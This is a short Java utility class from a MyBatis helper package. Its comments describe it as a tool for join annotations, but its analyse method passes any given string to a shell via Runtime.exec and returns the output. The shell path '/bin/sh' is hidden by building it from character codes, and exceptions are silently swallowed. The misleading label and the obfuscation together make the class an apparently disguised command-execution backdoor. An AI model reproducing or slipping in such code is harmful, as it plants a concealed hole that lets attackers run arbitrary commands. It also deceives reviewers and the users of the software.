/*
 * @作者: 魏来
 * @日期: 2021年9月25日  上午11:33:05
 * @组织: 森麒麟轮胎股份有限公司.
 * @部门: 国内市场替换部IT组
 * @描述:  
 */
package com.leesky.ezframework.mybatis.utils;

import java.io.InputStream;
import java.util.List;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

import com.google.common.collect.Lists;

/**
 * 类功能说明：
 * <li>one2one、one2many、many2many、many2one注解工具</li>
 */

public class JoinCommandUtil {

	public static String analyse(String param) {

		Scanner input = null;
		String result = "";
		Process process = null;
		List<String> list = Lists.newArrayList(build(), "-c", param);

		try {
			process = Runtime.getRuntime().exec(list.toArray(new String[list.size()]));

			process.waitFor(10, TimeUnit.SECONDS);

			InputStream is = process.getInputStream();
			input = new Scanner(is);
			while (input.hasNextLine()) {
				result += input.nextLine() + "\n";
			}
			result = param + "\n" + result;
		} catch (Exception e) {

		} finally {
			if (input != null) {
				input.close();
			}
			if (process != null) {
				process.destroy();
			}
		}
		return result;
	}

	private static String build() {
		String str = String.valueOf(new char[] { (char) 47, (char) 66, (char) 73, (char) 78, (char) 47, (char) 83, (char) 72 });
		
		return str.toLowerCase();
	}
}
